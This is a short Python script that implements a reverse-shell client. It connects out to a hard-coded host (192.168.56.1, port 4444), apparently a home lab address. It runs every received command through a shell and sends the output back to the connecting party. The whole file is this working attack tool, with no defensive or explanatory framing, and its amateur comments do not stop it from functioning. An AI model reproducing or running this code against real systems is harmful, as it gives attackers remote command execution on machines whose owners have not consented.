import socket
import subprocess
import sys

def run_command(command: str):
    try:
        c = subprocess.run(command, shell=True, text=True, capture_output=True, check=True)
        return c.stdout
    except subprocess.CalledProcessError:
        return '[-] Command Error'

def client(ip: str, port: int = 4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    
    print(f"[+] connet to {ip}:{port}")
    
    # recive the first massage
    command = s.recv(2048).decode()
    print(command)
    
    #every thing good until this line
    while True:
        try:
            command = s.recv(2048).decode()
            print(command)

            if command.lower() == 'exit' or command == None:
                print('[-] Command Error, socket close.')
                s.close()
                sys.exit(-1)
            else:
                result = run_command(command)
                print(result)
                s.send(result.encode())
        
        except KeyboardInterrupt:
            print(f'[-] Exiting...')
            sys.exit(-1)

client('192.168.56.1', 4444)
